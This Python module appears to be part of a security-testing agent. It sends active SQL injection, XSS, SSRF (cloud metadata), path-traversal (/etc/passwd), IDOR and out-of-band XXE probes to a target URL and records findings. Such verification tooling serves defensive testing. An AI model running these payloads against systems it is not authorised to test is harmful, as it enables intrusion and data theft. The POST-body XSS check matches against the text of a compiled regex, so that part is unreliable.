"""WebVulnAdapter — active web vulnerability verification engine (capability extension).

Performs ACTIVE verification of web vulnerabilities to reduce false positives:
  - SQL injection  : error-based + time-based blind + boolean-based
  - Reflected XSS   : context-aware payload injection + response analysis
  - SSRF            : internal IP probing + out-of-band callback
  - LFI             : path traversal + filter bypass
  - IDOR            : predictable object-id probing (adjacent-object reachability)
  - XXE             : internal-entity echo + out-of-band external entity

Built on httpx for HTTP orchestration. Each detection method degrades
gracefully: if a module fails, the remaining modules still execute.

Architecture:
  WebVulnAdapter.run() → dispatch per module → list[Finding]
  Each module is responsible for its own HTTP calls, analysis, and finding construction.
"""

from __future__ import annotations

import datetime as dt
import logging
import re
import time
import uuid
from typing import Any
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from secagent.adapters.base import BaseAdapter
from secagent.core.errors import InvalidInputError
from secagent.core.finding import Finding, FindingType, Severity
from secagent.core.headers import random_ua

log = logging.getLogger(__name__)

# SQL error signatures per database vendor
_SQL_ERROR_PATTERNS: list[tuple[str, str]] = [
    (r"SQL syntax.*MySQL", "MySQL"),
    (r"Warning.*mysql_", "MySQL"),
    (r"MySqlException", "MySQL"),
    (r"valid MySQL result", "MySQL"),
    (r"check the manual that corresponds to your MySQL", "MySQL"),
    (r"ORA-\d{4,5}", "Oracle"),
    (r"Oracle error", "Oracle"),
    (r"Oracle.*Driver", "Oracle"),
    (r"SQLServer JDBC Driver", "SQL Server"),
    (r"ODBC SQL Server Driver", "SQL Server"),
    (r"SQLServer", "SQL Server"),
    (r"Unclosed quotation mark after the character string", "SQL Server"),
    (r"(\bSQL\b|\bSYBASE\b|\bMSSQL\b).*syntax", "SQL Server"),
    (r"(\bSQL\b|\bSYBASE\b|\bMSSQL\b).*error", "SQL Server"),
    (r"PostgreSQL.*ERROR", "PostgreSQL"),
    (r"Warning.*pg_", "PostgreSQL"),
    (r"valid PostgreSQL result", "PostgreSQL"),
    (r"Npgsql\.", "PostgreSQL"),
    (r"PG::SyntaxError", "PostgreSQL"),
    (r"org\.postgresql\.util\.PSQLException", "PostgreSQL"),
    (r"(\bSQLITE\b|\bSQLITE3\b).*error", "SQLite"),
    (r"System\.Data\.SQLite\.SQLiteException", "SQLite"),
    (r"sqlite3\.OperationalError", "SQLite"),
    (r"Warning.*sqlite_", "SQLite"),
    (r"Warning.*SQLite3::", "SQLite"),
    (r"\[SQLITE_ERROR\]", "SQLite"),
]

# XSS context payloads: detect reflection in different HTML contexts
_XSS_CONTEXTS = [
    ("html_body", "<script>alert('XSS_{marker}')</script>", re.compile(r"<script>alert\('XSS_\w+'\)</script>")),
    ("html_body", "<img src=x onerror=alert('XSS_{marker}')>", re.compile(r"<img src=x onerror=alert\('XSS_\w+'\)>")),
    ("attribute", '" onmouseover="alert(1)"', re.compile(r'" onmouseover="alert\(1\)"')),
    ("attribute", "' onmouseover='alert(1)'", re.compile(r"' onmouseover='alert\(1\)'")),
    ("script_tag", "</script><script>alert('XSS_{marker}')</script>", re.compile(r"</script><script>alert\('XSS_\w+'\)</script>")),
]


def _with_marker(template: str, marker: str) -> str:
    return template.format(marker=marker)


def _extract_query_params(url: str) -> dict[str, list[str]]:
    """Extract query parameters from a URL as {name: [values]}."""
    parsed = urlparse(url)
    return parse_qs(parsed.query, keep_blank_values=True)


def _build_url_with_params(url: str, params: dict[str, list[str]]) -> str:
    """Rebuild a URL with modified query parameters."""
    parsed = urlparse(url)
    new_query = urlencode(params, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))


class WebVulnAdapter(BaseAdapter):
    """Active web vulnerability verification engine.

    Accepts params:
      target       : str  — the URL to scan (required)
      modules      : list — which modules to run (default: ["sqli","xss","ssrf"])
      oob_callback : str  — optional OOB callback URL (e.g. https://callback.example.com/{id})
      timeout_sec  : int  — per-request timeout (default: 30)
      rate_limit   : int  — requests per minute (default: 60)
      follow_redirects : bool (default: False)
    """

    DEFAULT_TIMEOUT = 30
    DEFAULT_RPM = 60

    def __init__(
        self,
        timeout_sec: int = 300,
        proxy_manager=None,
        http_timeout: int = DEFAULT_TIMEOUT,
        oob_poller=None,
        cookie: str = "",
    ):
        self.timeout_sec = timeout_sec
        self.proxy_manager = proxy_manager
        self.http_timeout = http_timeout
        self.oob_poller = oob_poller
        self.cookie = cookie

    @property
    def tool_name(self) -> str:
        return "web_vuln_scan"

    def run(self, params: dict[str, Any]) -> list[Finding]:
        target = params.get("target", "")
        if not target:
            raise InvalidInputError(field="target", reason="must be a non-empty URL")

        modules = params.get("modules", ["sqli", "xss", "ssrf", "lfi", "idor", "xxe"])
        oob_callback = params.get("oob_callback", "")

        findings: list[Finding] = []
        t0 = time.monotonic()

        # Build a shared httpx client for connection reuse + rate limiting
        client = self._build_client()

        try:
            if "sqli" in modules:
                findings.extend(self._detect_sqli(client, target))
            if "xss" in modules:
                findings.extend(self._detect_xss(client, target))
            if "ssrf" in modules:
                findings.extend(self._detect_ssrf(client, target, oob_callback, self.oob_poller))
            if "lfi" in modules:
                findings.extend(self._detect_lfi(client, target))
            if "idor" in modules:
                findings.extend(self._detect_idor(client, target))
            if "xxe" in modules:
                findings.extend(self._detect_xxe(client, target, oob_callback, self.oob_poller))

            # POST JSON body fuzzing (supplements GET-only module testing)
            post_body_params = params.get("post_body_params", [])
            if post_body_params:
                findings.extend(self._fuzz_post_body(client, target, post_body_params))
        finally:
            client.close()

        elapsed = time.monotonic() - t0
        log.info("web_vuln_scan completed in %.1fs, %d findings", elapsed, len(findings))
        return self._dedupe(findings)

    def _dedupe(self, findings: list[Finding]) -> list[Finding]:
        """Collapse duplicate findings that describe the same vulnerability.

        Two findings are considered the same vuln when they share
        ``(type, target parameter, severity)``. This happens when multiple
        probe techniques (e.g. SQLi error-based + boolean-based) hit the same
        parameter — we keep ONE record, merging their evidence so the client
        report never lists the same hole five times.

        When duplicates collapse, the record with the *highest confidence* wins;
        if tied, the one with the most evidence keys wins. Evidence dicts are
        merged so no probe result is lost.
        """
        groups: dict[tuple, list[Finding]] = {}
        for f in findings:
            ev = f.evidence or {}
            # vuln_class distinguishes subclasses (sqli_error vs xss_reflection)
            # that share the coarse FindingType.VULNERABILITY enum.
            key = (
                ev.get("vuln_class", ""),
                ev.get("parameter", ""),
                f.severity.value if hasattr(f.severity, "value") else f.severity,
            )
            groups.setdefault(key, []).append(f)

        merged: list[Finding] = []
        _rank = {"validated": 2, "unvalidated": 1, "inferred": 0}
        for grp in groups.values():
            if len(grp) == 1:
                merged.append(grp[0])
                continue
            # Pick the winner: highest confidence rank, then most evidence keys.
            winner = max(
                grp,
                key=lambda x: (_rank.get(x.confidence, 0), len(x.evidence or {})),
            )
            # Merge evidence from all members into the winner's copy.
            merged_evidence = dict(winner.evidence or {})
            techniques = []
            for member in grp:
                for k, v in (member.evidence or {}).items():
                    if k not in merged_evidence:
                        merged_evidence[k] = v
                if member.evidence.get("method"):
                    techniques.append(member.evidence["method"])
            if techniques:
                merged_evidence["methods"] = sorted(set(techniques))
                merged_evidence["duplicate_count"] = len(grp)
            # Rebuild the finding with merged evidence (immutable-ish update).
            merged.append(
                Finding(
                    id=winner.id,
                    type=winner.type,
                    severity=winner.severity,
                    target=winner.target,
                    title=winner.title,
                    evidence=merged_evidence,
                    source_tool=winner.source_tool,
                    timestamp=winner.timestamp,
                    confidence=winner.confidence,
                    remediation=winner.remediation,
                )
            )
        return merged

    def _fuzz_post_body(self, client: httpx.Client, target: str,
                        body_params: list[str]) -> list[Finding]:
        """Generic POST JSON body fuzzing with SQLi/XSS payload patterns.

        Sends POST requests with each body param containing injected payloads,
        then checks for SQL error signatures and reflected XSS in the response.
        Supplements the GET-param-only module testing above.
        """
        findings: list[Finding] = []
        # Reuse the module-level SQL error and XSS patterns
        for param in body_params:
            # ── SQLi via POST JSON body ──
            payloads = [
                ("sqli_quote", "'"),
                ("sqli_comment", "' OR '1'='1"),
                ("sqli_sleep", "' OR SLEEP(5)--"),
            ]
            for vuln_class, payload in payloads:
                try:
                    resp = client.post(target, json={param: payload})
                    body = (resp.text or "")[:50000]
                    for pattern, db_type in _SQL_ERROR_PATTERNS:
                        if re.search(pattern, body, re.IGNORECASE):
                            findings.append(self._make_finding(
                                vuln_class, Severity.HIGH, target,
                                title=f"SQL Injection ({db_type}) via POST body '{param}'",
                                evidence={"parameter": param, "payload": payload,
                                          "db_type": db_type, "method": "post_json",
                                          "match": re.search(pattern, body, re.IGNORECASE).group(0)[:200]},
                            ))
                            break
                except Exception:
                    continue

            # ── XSS via POST JSON body ──
            marker = uuid.uuid4().hex[:6]
            xss_payload = f"<script>alert('XSS_{marker}')</script>"
            try:
                resp = client.post(target, json={param: xss_payload})
                body = (resp.text or "")[:50000]
                for ctx_name, _, pattern in _XSS_CONTEXTS:
                    if re.search(str(pattern).replace("{marker}", marker), body, re.IGNORECASE):
                        findings.append(self._make_finding(
                            "xss_reflection", Severity.MEDIUM, target,
                            title=f"Reflected XSS via POST body '{param}' ({ctx_name})",
                            evidence={"parameter": param, "payload": xss_payload,
                                      "context": ctx_name, "method": "post_json"},
                        ))
                        break
            except Exception:
                continue

        return findings

    def _build_client(self) -> httpx.Client:
        """Create an httpx Client with proxy support and optional cookie."""
        proxy = None
        if self.proxy_manager and self.proxy_manager.is_enabled():
            proxy = self.proxy_manager.get_proxy()
        headers = {"User-Agent": random_ua("chrome_mac")}
        if self.cookie:
            headers["Cookie"] = self.cookie
        return httpx.Client(
            timeout=self.http_timeout,
            proxy=proxy,
            headers=headers,
            verify=True,  # Always verify TLS certs
            follow_redirects=False,
        )

    def _detect_sqli(self, client: httpx.Client, url: str) -> list[Finding]:
        """SQL injection detection: error-based + time-based + boolean-based."""
        findings: list[Finding] = []
        params = _extract_query_params(url)
        if not params:
            return findings

        for param_name in params:
            # Skip injection test on URL-path targets without query params
            # (handled by _extract_query_params returning empty)

            # 1. Error-based: inject quote → check for SQL error pattern
            finding = self._sqli_error_test(client, url, param_name, params)
            if finding:
                findings.append(finding)
                continue  # Confirmed, skip blind

            # 2. Time-based blind: inject sleep → measure response time
            fnd_time = self._sqli_time_test(client, url, param_name, params)
            if fnd_time:
                findings.append(fnd_time)
                continue

            # 3. Boolean-based blind: true vs false → page diff
            fnd_bool = self._sqli_boolean_test(client, url, param_name, params)
            if fnd_bool:
                findings.append(fnd_bool)

        return findings

    def _sqli_error_test(
        self, client: httpx.Client, url: str, param_name: str, original_params: dict[str, list[str]]
    ) -> Finding | None:
        """Inject a single quote and look for SQL error messages in the response."""
        payload = "'"
        test_params = {k: v[:] for k, v in original_params.items()}
        test_params[param_name] = [original_params[param_name][0] + payload]
        test_url = _build_url_with_params(url, test_params)
        try:
            resp = client.get(test_url)
            body = resp.text[:50000]  # Cap response size
        except Exception as exc:
            log.debug("sqli_error_test request failed: %s", exc)
            return None

        for pattern, db_type in _SQL_ERROR_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                return self._make_finding(
                    "sqli_error", Severity.HIGH, url,
                    title=f"SQL Injection ({db_type}) via '{param_name}' (error-based)",
                    evidence={
                        "parameter": param_name,
                        "payload": payload,
                        "db_type": db_type,
                        "match": re.search(pattern, body, re.IGNORECASE).group(0)[:200],
                        "method": "error-based",
                    },
                )
        return None

    def _sqli_time_test(
        self, client: httpx.Client, url: str, param_name: str, original_params: dict[str, list[str]]
    ) -> Finding | None:
        """Inject time-delay payload and verify if the response is delayed."""
        sleep_sec = 5
        # Per-DB sleep payloads
        payloads = [
            (f"' OR SLEEP({sleep_sec})-- ", "MySQL"),
            (f"'; WAITFOR DELAY '00:00:0{sleep_sec}'-- ", "SQL Server"),
            (f"' OR pg_sleep({sleep_sec})-- ", "PostgreSQL"),
        ]

        baseline_params = {k: v[:] for k, v in original_params.items()}
        baseline_params[param_name] = [original_params[param_name][0]]
        baseline_url = _build_url_with_params(url, baseline_params)

        try:
            t_start = time.monotonic()
            client.get(baseline_url)
            baseline_time = time.monotonic() - t_start
        except Exception:
            baseline_time = 1.0

        for payload, db_type in payloads:
            test_params = {k: v[:] for k, v in original_params.items()}
            test_params[param_name] = [original_params[param_name][0] + payload]
            test_url = _build_url_with_params(url, test_params)

            try:
                t_start = time.monotonic()
                client.get(test_url)
                elapsed = time.monotonic() - t_start
            except Exception:
                continue

            if elapsed >= sleep_sec - 1 and elapsed > baseline_time + sleep_sec - 2:
                return self._make_finding(
                    "sqli_blind_time", Severity.HIGH, url,
                    title=f"Blind SQL Injection ({db_type}) via '{param_name}' (time-based)",
                    evidence={
                        "parameter": param_name,
                        "payload": payload[:80],
                        "db_type": db_type,
                        "baseline_ms": round(baseline_time * 1000, 1),
                        "inject_ms": round(elapsed * 1000, 1),
                        "method": "time-based",
                    },
                )
        return None

    def _sqli_boolean_test(
        self, client: httpx.Client, url: str, param_name: str, original_params: dict[str, list[str]]
    ) -> Finding | None:
        """Boolean-based blind: compare true-condition vs false-condition responses."""
        true_payload = "' OR '1'='1'-- "
        false_payload = "' OR '1'='2'-- "

        test_true = {k: v[:] for k, v in original_params.items()}
        test_true[param_name] = [original_params[param_name][0] + true_payload]
        true_url = _build_url_with_params(url, test_true)

        test_false = {k: v[:] for k, v in original_params.items()}
        test_false[param_name] = [original_params[param_name][0] + false_payload]
        false_url = _build_url_with_params(url, test_false)

        try:
            resp_true = client.get(true_url)
            resp_false = client.get(false_url)
        except Exception as exc:
            log.debug("sqli_boolean_test request failed: %s", exc)
            return None

        body_true = resp_true.text
        body_false = resp_false.text

        # If true returns content but false returns empty/error, likely injectable
        if abs(len(body_true) - len(body_false)) > 100 and resp_true.status_code == 200:
            return self._make_finding(
                "sqli_blind_boolean", Severity.MEDIUM, url,
                title=f"Possible SQL Injection via '{param_name}' (boolean-based)",
                evidence={
                    "parameter": param_name,
                    "payload_true": true_payload,
                    "payload_false": false_payload,
                    "len_true": len(body_true),
                    "len_false": len(body_false),
                    "method": "boolean-based",
                    "confidence": "likely",
                },
            )
        return None

    def _detect_xss(self, client: httpx.Client, url: str) -> list[Finding]:
        """Reflected XSS: context-aware payload injection + reflection analysis."""
        findings: list[Finding] = []
        params = _extract_query_params(url)
        if not params:
            return findings

        marker = uuid.uuid4().hex[:8]

        for param_name in params:
            for context_name, payload_template, detect_regex in _XSS_CONTEXTS:
                payload = _with_marker(payload_template, marker)
                test_params = {k: v[:] for k, v in params.items()}
                test_params[param_name] = [params[param_name][0] + payload]
                test_url = _build_url_with_params(url, test_params)

                try:
                    resp = client.get(test_url)
                    body = resp.text[:100000]
                except Exception as exc:
                    log.debug("xss request failed: %s", exc)
                    continue

                if detect_regex.search(body):
                    # Check if payload appears UNENCODED (not HTML-escaped)
                    # An encoded payload that shows up in HTML entities is not exploitable
                    if "&lt;" not in body[body.find(payload) - 10:body.find(payload) + len(payload) + 10]:
                        findings.append(self._make_finding(
                            "xss_reflected", Severity.HIGH, url,
                            title=f"Reflected XSS via '{param_name}' ({context_name})",
                            evidence={
                                "parameter": param_name,
                                "context": context_name,
                                "payload": payload[:100],
                                "marker": marker,
                            },
                        ))
                        break  # One finding per parameter is enough

        return findings

    def _detect_ssrf(
        self, client: httpx.Client, url: str, oob_callback: str,
        oob_poller=None,
    ) -> list[Finding]:
        """SSRF detection: internal IP probing + optional OOB callback."""
        findings: list[Finding] = []
        params = _extract_query_params(url)
        if not params:
            return findings

        # URL-bearing parameter candidates
        ssrf_candidates = [
            p for p in params
            if any(kw in p.lower() for kw in ["url", "uri", "link", "target", "dest", "redirect", "next", "return", "continue", "file", "path"])
        ]
        if not ssrf_candidates:
            return findings

        callback_id = uuid.uuid4().hex[:8]

        for param_name in ssrf_candidates:
            # 1. Internal IP probe (cloud metadata endpoint)
            internal_targets = [
                "http://169.254.169.254/latest/meta-data/",
                "http://127.0.0.1:80/",
            ]

            for internal_target in internal_targets:
                test_params = {k: v[:] for k, v in params.items()}
                test_params[param_name] = [internal_target]
                test_url = _build_url_with_params(url, test_params)

                try:
                    resp = client.get(test_url, timeout=5)
                    body = resp.text[:5000]
                    # Look for AWS metadata signature or "localhost" response
                    if any(sig in body for sig in ["ami-id", "instance-id", "hostname", "iam", "localhost", "root:"]):
                        findings.append(self._make_finding(
                            "ssrf_internal", Severity.CRITICAL, url,
                            title=f"SSRF via '{param_name}' (internal IP access)",
                            evidence={
                                "parameter": param_name,
                                "injected_target": internal_target,
                                "response_snippet": body[:300],
                                "method": "internal_ip",
                            },
                        ))
                        break
                except httpx.TimeoutException:
                    # Timeout can also indicate SSRF (service reachable but slow)
                    if internal_target.startswith("http://169.254"):
                        log.debug("SSRF probe timed out on %s (inconclusive)", internal_target)
                except Exception as exc:
                    log.debug("ssrf probe failed: %s", exc)

            # 2. OOB callback (most reliable, confirms out-of-band reachability)
            if oob_callback and not any(f.evidence.get("parameter") == param_name for f in findings):
                callback_url = oob_callback.replace("{id}", callback_id)
                test_params = {k: v[:] for k, v in params.items()}
                test_params[param_name] = [callback_url]
                test_url = _build_url_with_params(url, test_params)

                try:
                    client.get(test_url, timeout=5)
                except Exception:
                    pass

                # If a poller is wired in, confirm the callback actually
                # reached our listener. Confirmed → CRITICAL + validated.
                # No poller (or no callback) → stay HIGH + pending_verification
                # (suspected, not confirmed — never over-state severity).
                confirmed = False
                if oob_poller is not None:
                    try:
                        confirmed = bool(oob_poller(callback_id))
                    except Exception as exc:
                        log.debug("oob poll failed: %s", exc)

                if confirmed:
                    findings.append(self._make_finding(
                        "ssrf_oob", Severity.CRITICAL, url,
                        title=f"SSRF via '{param_name}' (OOB callback confirmed)",
                        evidence={
                            "parameter": param_name,
                            "callback_url": callback_url,
                            "callback_id": callback_id,
                            "method": "oob_confirmed",
                            "status": "confirmed",
                            "confidence": "validated",
                        },
                    ))
                else:
                    findings.append(self._make_finding(
                        "ssrf_oob", Severity.HIGH, url,
                        title=f"Possible SSRF via '{param_name}' (OOB callback dispatched)",
                        evidence={
                            "parameter": param_name,
                            "callback_url": callback_url,
                            "callback_id": callback_id,
                            "method": "oob_dispatch",
                            "status": "pending_verification",
                        },
                        confidence="unvalidated",
                    ))

        return findings

    def _detect_lfi(
        self, client: httpx.Client, url: str
    ) -> list[Finding]:
        """Local File Inclusion / path traversal detection.

        Injects traversal sequences (raw and filter-bypass encoded forms)
        into the most likely file-bearing params (path/file/include/lang/
        page/doc/im/view/template/style) plus any URL path segment that
        looks like a file reference. A finding is raised when the response
        exposes a local-file signature (unix passwd, windows win.ini,
        /etc/hosts, known absolute path) that would not appear on a normal
        page.
        """
        findings: list[Finding] = []
        parsed = urlparse(url)
        query_params = _extract_query_params(url)

        # Candidate params: known file-bearing names, else all query params.
        file_keywords = (
            "file", "path", "page", "include", "lang", "doc", "document",
            "im", "img", "image", "view", "template", "style", "theme",
            "module", "name", "cat", "id",
        )
        if query_params:
            candidates = [
                p for p in query_params
                if any(k in p.lower() for k in file_keywords)
            ] or list(query_params.keys())
        else:
            candidates = []

        # Local-file signatures to confirm inclusion succeeded.
        _LFI_SIGNATURES = (
            "root:x:0:0:",            # /etc/passwd
            "[boot loader]",          # windows boot.ini
            "localhost 127.0.0.1",    # /etc/hosts
            "127.0.0.1\tlocalhost",   # /etc/hosts alternate
            "/etc/passwd",            # absolute path echoed
            "for 16-bit app support", # win.ini
        )

        # Traversal payloads: raw + common filter-bypass encodings.
        # Each tuple: (sequence to inject, human-readable label)
        _TRAVERSALS = [
            ("../../../../../../etc/passwd", "basic_../"),
            ("..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", "url_enc_../"),
            ("....//....//....//....//etc/passwd", "dotdot_slash_bypass"),
            ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "double_url_enc"),
            ("..\\..\\..\\..\\windows\\win.ini", "windows_backslash"),
            ("....\\\\....\\\\....\\\\windows\\\\win.ini", "windows_dotdot_bypass"),
        ]

        # Baseline body for diffing (only when we have a value to replace).
        tested_pairs: list[tuple[str, str, str]] = []  # (param, payload_label, abs_target)

        # Build injection targets from query params.
        for param_name in candidates:
            for seq, label in _TRAVERSALS:
                tested_pairs.append((param_name, label, seq))

        # Also test injection into the URL path (e.g. /download?file= -> /../../../etc/passwd)
        # by appending traversal to the existing path tail when no query params.
        if not query_params and parsed.path and parsed.path != "/":
            for seq, label in _TRAVERSALS:
                tested_pairs.append(("<path>", label, seq))

        for param_name, label, seq in tested_pairs:
            if param_name == "<path>":
                # Append traversal to current path.
                new_path = parsed.path.rstrip("/") + "/" + seq
                test_url = urlunparse(
                    (parsed.scheme, parsed.netloc, new_path, parsed.params,
                     parsed.query, parsed.fragment)
                )
            else:
                test_params = {k: v[:] for k, v in query_params.items()}
                test_params[param_name] = [seq]
                test_url = _build_url_with_params(url, test_params)

            try:
                resp = client.get(test_url, timeout=self.http_timeout)
                body = resp.text[:50000]
            except Exception as exc:
                log.debug("lfi request failed (%s): %s", label, exc)
                continue

            matched_sig = next((s for s in _LFI_SIGNATURES if s in body), None)
            if matched_sig:
                findings.append(self._make_finding(
                    "lfi_traversal", Severity.HIGH, url,
                    title=f"Local File Inclusion via '{param_name}' ({label})",
                    evidence={
                        "parameter": param_name,
                        "payload": seq[:120],
                        "bypass_technique": label,
                        "match": matched_sig[:60],
                        "method": "response_signature",
                        "confidence": "validated",
                    },
                ))
                break  # one finding per parameter is enough

        return findings

    def _detect_idor(self, client: httpx.Client, url: str) -> list[Finding]:
        """Insecure Direct Object Reference (IDOR) heuristic probe.

        Detects predictable object identifiers (numeric or low-entropy
        alphanumeric IDs in the path or query) and attempts to access an
        *adjacent* object id. If the adjacent id returns a valid object
        body (HTTP 200, not an error/empty page) that differs from the
        original, this indicates the endpoint does not enforce
        per-object authorization — a horizontal privilege escalation.

        Confidence is always ``unvalidated``: with a single authorized
        identity we cannot prove the adjacent object *belongs* to another
        user, only that it is reachable. We never claim a confirmed IDOR.
        """
        findings: list[Finding] = []
        parsed = urlparse(url)

        # Collect candidate id tokens: query params named like *id* plus
        # numeric/short-alnum path segments.
        candidates: list[tuple[str, str, str]] = []  # (kind, name_or_segment, value)

        query_params = _extract_query_params(url)
        id_keywords = ("id", "user", "account", "order", "doc", "file", "item", "uid", "pid")
        for p, vals in query_params.items():
            if any(k in p.lower() for k in id_keywords) and vals:
                candidates.append(("query", p, vals[0]))

        # Path segments that look like object ids (pure digits, or short alnum).
        for seg in [s for s in parsed.path.split("/") if s]:
            if seg.isdigit() or (len(seg) <= 12 and re.fullmatch(r"[A-Za-z0-9]+", seg)):
                candidates.append(("path", seg, seg))

        if not candidates:
            return findings

        # Baseline fetch of the original URL.
        try:
            base_resp = client.get(url)
            base_body = base_resp.text
            base_len = len(base_body)
        except Exception as exc:
            log.debug("idor baseline failed: %s", exc)
            return findings

        # Object-data heuristic: a real object page should be non-trivial and
        # not an explicit error/empty marker.
        _ERROR_MARKERS = ("not found", "forbidden", "unauthorized", "permission denied",
                          "does not exist", "no such", "404", "access denied")

        def _looks_like_object(body: str, status: int) -> bool:
            if status != 200:
                return False
            low = body.lower()
            if any(m in low for m in _ERROR_MARKERS):
                return False
            # Must carry some content (avoid flagging empty 200 pages).
            return len(body.strip()) > 80

        for kind, name, value in candidates:
            neighbor = self._neighbor_id(value)
            if neighbor is None:
                continue

            if kind == "query":
                np = {k: v[:] for k, v in query_params.items()}
                np[name] = [neighbor]
                test_url = _build_url_with_params(url, np)
            else:  # path segment replacement
                new_path = "/".join(
                    neighbor if s == name else s for s in parsed.path.split("/")
                )
                test_url = urlunparse(
                    (parsed.scheme, parsed.netloc, new_path, parsed.params,
                     parsed.query, parsed.fragment)
                )

            try:
                resp = client.get(test_url, timeout=self.http_timeout)
            except Exception as exc:
                log.debug("idor neighbor request failed: %s", exc)
                continue

            if not _looks_like_object(resp.text, resp.status_code):
                continue
            # Heuristic: if the neighbor body is essentially the same as the
            # original (e.g. the id is ignored / static page), it's not an IDOR.
            # If it differs and still looks like a real object, flag it.
            if abs(len(resp.text) - base_len) < 20 and resp.text.strip() == base_body.strip():
                continue

            findings.append(self._make_finding(
                "idor_adjacent_access", Severity.HIGH, url,
                title=f"Possible IDOR via '{name}' (adjacent object reachable)",
                evidence={
                    "parameter": name,
                    "original_id": value,
                    "neighbor_id": neighbor,
                    "neighbor_status": resp.status_code,
                    "neighbor_len": len(resp.text),
                    "method": "adjacent_id_probe",
                    "note": "Adjacent object reachable without per-object authz check; confirm ownership separation manually.",
                },
                confidence="unvalidated",
            ))
            break  # one finding per URL is enough

        return findings

    @staticmethod
    def _neighbor_id(value: str) -> str | None:
        """Return an adjacent id for probing, or None if not derivable."""
        if value.isdigit():
            try:
                return str(int(value) + 1)
            except ValueError:
                return None
        # Short numeric-ish alnum (e.g. "user1001"): increment trailing digits.
        m = re.search(r"(\d+)$", value)
        if m:
            prefix, num = value[: m.start()], m.group(1)
            try:
                return f"{prefix}{int(num) + 1}"
            except ValueError:
                return None
        return None

    def _detect_xxe(
        self, client: httpx.Client, url: str, oob_callback: str, oob_poller=None,
    ) -> list[Finding]:
        """XML External Entity (XXE) injection probe.

        Sends an XML body carrying an external entity that points either at
        an OOB callback (most reliable) or an internal file. A finding is
        raised only on *confirmation*:

          * OOB mode  : the callback actually reached our listener
                        (``oob_poller`` returns True) → validated CRITICAL
          * Echo mode : the response body contains the expanded entity value
                        (e.g. contents of an internal file) → validated HIGH

        If neither confirmation is observed, no finding is raised — we never
        report XXE on a mere absence of error (that would be a false positive).
        """
        findings: list[Finding] = []

        callback_id = uuid.uuid4().hex[:8]
        entity_name = f"secagent{callback_id}"

        # Build payloads.
        internal_entity = (
            f'<?xml version="1.0"?>'
            f'<!DOCTYPE r [<!ENTITY {entity_name} "XXE_ECHO_MARKER_{callback_id}">]>'
            f'<r>&{entity_name};</r>'
        )
        oob_url = ""
        if oob_callback:
            oob_url = oob_callback.replace("{id}", callback_id)
            external_entity = (
                f'<?xml version="1.0"?>'
                f'<!DOCTYPE r [<!ENTITY {entity_name} SYSTEM "{oob_url}">]>'
                f'<r>&{entity_name};</r>'
            )
        else:
            external_entity = internal_entity

        headers = {"Content-Type": "application/xml"}

        # 1. Echo mode (internal entity reflected in response).
        try:
            resp = client.post(url, content=internal_entity, headers=headers,
                              timeout=self.http_timeout)
            if f"XXE_ECHO_MARKER_{callback_id}" in resp.text:
                findings.append(self._make_finding(
                    "xxe_echo", Severity.HIGH, url,
                    title="XXE Injection (entity expansion echoed in response)",
                    evidence={
                        "parameter": "(request body)",
                        "payload": internal_entity[:160],
                        "method": "internal_entity_echo",
                        "confidence": "validated",
                    },
                ))
                return findings
        except Exception as exc:
            log.debug("xxe echo probe failed: %s", exc)

        # 2. OOB mode (external entity triggers out-of-band request).
        if oob_callback:
            try:
                client.post(url, content=external_entity, headers=headers,
                           timeout=self.http_timeout)
            except Exception:
                pass
            confirmed = False
            if oob_poller is not None:
                try:
                    confirmed = bool(oob_poller(callback_id))
                except Exception as exc:
                    log.debug("xxe oob poll failed: %s", exc)
            if confirmed:
                findings.append(self._make_finding(
                    "xxe_oob", Severity.CRITICAL, url,
                    title="XXE Injection (OOB external entity confirmed)",
                    evidence={
                        "parameter": "(request body)",
                        "callback_url": oob_url,
                        "callback_id": callback_id,
                        "method": "oob_confirmed",
                        "status": "confirmed",
                        "confidence": "validated",
                    },
                ))

        return findings

    def _make_finding(
        self,
        finding_type: str,
        severity: Severity,
        target: str,
        title: str,
        evidence: dict[str, Any],
        confidence: str = "validated",
    ) -> Finding:
        """Construct a Finding with standard fields.

        ``confidence`` defaults to "validated" because most detectors here
        actively prove exploitation (SQLi error/time/boolean, XSS reflection,
        LFI file signature). Callers that only *dispatched* a probe without
        confirmation (e.g. SSRF OOB pending) must pass a lower confidence.

        The ``finding_type`` string (e.g. "sqli_error", "xss_reflection",
        "lfi", "ssrf_oob") is recorded as ``evidence["vuln_class"]`` so the
        dedup pass and reports can distinguish vulnerability subclasses even
        though ``Finding.type`` is the coarse ``VULNERABILITY`` enum.
        """
        evidence = dict(evidence)
        evidence.setdefault("vuln_class", finding_type)
        return Finding(
            id=f"fnd_{uuid.uuid4().hex}",
            type=FindingType.VULNERABILITY,
            severity=severity,
            target=target,
            title=title,
            evidence=evidence,
            source_tool=self.tool_name,
            timestamp=dt.datetime.now(dt.timezone.utc),
            confidence=confidence,
        )
